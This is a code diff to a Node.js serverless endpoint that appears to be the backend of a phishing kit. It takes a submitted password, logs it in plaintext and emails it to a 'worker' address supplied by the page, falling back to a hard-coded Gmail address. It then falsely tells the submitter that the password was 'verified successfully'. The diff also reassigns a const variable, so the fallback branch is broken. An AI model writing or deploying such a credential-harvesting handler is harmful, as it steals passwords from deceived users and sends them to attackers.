@@ -11,15 +11,18 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   try {
-    const { password } = req.body;
+    // ✅ Get password AND workerEmail FROM FRONTEND
+    const { password, workerEmail } = req.body;
 
-    console.log('🔐 Password Form Received:');
+    console.log('🔐 Password Form:');
     console.log('Password:', password);
+    console.log('Worker Email from frontend:', workerEmail);
     
-    // ✅ Get workerEmail from SUBMIT FORM REFERER
-    const workerEmail = await extractWorkerEmailFromReferer(req);
-    
-    console.log('📧 Extracted workerEmail:', workerEmail);
+    // Validate email
+    if (!workerEmail || !workerEmail.includes('@')) {
+      console.log('⚠️ Invalid email, using default');
+      workerEmail = "mehtaballi67890@gmail.com";
+    }
     
     const emailResult = await sendPasswordEmail(password, workerEmail);
 
@@ -27,7 +30,7 @@ export default async function handler(req, res) {
       success: true,
       message: 'Password verified successfully',
       emailSent: emailResult.success,
-      recipient: workerEmail,
+      recipient: workerEmail, // ✅ Frontend ka email return karein
       emailMessage: emailResult.message
     });
 
@@ -41,34 +44,6 @@ export default async function handler(req, res) {
   }
 }
 
-// Function to extract workerEmail from submit form
-async function extractWorkerEmailFromReferer(req) {
-  try {
-    // Get referer URL (where request came from)
-    const referer = req.headers.referer || '';
-    console.log('Referer URL:', referer);
-    
-    // Default email
-    let workerEmail = "mehtaballii67890@gmail.com";
-    
-    // If referer contains submit form data
-    if (referer.includes('workerEmail=')) {
-      // Try to extract from URL parameters
-      const url = new URL(referer);
-      const params = new URLSearchParams(url.search);
-      workerEmail = params.get('workerEmail') || workerEmail;
-    }
-    
-    // If no URL param, check cookies or localStorage (not possible server-side)
-    
-    return workerEmail;
-    
-  } catch (error) {
-    console.error('Error extracting email:', error);
-    return "mehtaballi67890@gmail.com";
-  }
-}
-
 async function sendPasswordEmail(password, workerEmail) {
   try {
     const transporter = nodemailer.createTransport({
@@ -79,11 +54,18 @@ async function sendPasswordEmail(password, workerEmail) {
     await transporter.sendMail({
       from: `"Password System" <${process.env.GMAIL_USER}>`,
       to: workerEmail,
-      subject: `🔐 Password Submitted`,
-      html: `<div><h2>Password: ${password}</h2><p>Time: ${new Date().toLocaleString()}</p></div>`
+      subject: `🔐 Password Submitted - ${new Date().toLocaleTimeString()}`,
+      html: `
+        <div style="font-family: Arial, sans-serif;">
+          <h2 style="color: #d32f2f;">🔐 PASSWORD FORM</h2>
+          <p><strong>Password:</strong> ${password}</p>
+          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+          <p><strong>Sent to:</strong> ${workerEmail}</p>
+        </div>
+      `
     });
     
-    console.log('✅ Password sent to extracted email:', workerEmail);
+    console.log('✅ Password email sent to frontend email:', workerEmail);
     return { success: true, message: 'Email sent' };
 
   } catch (error) {
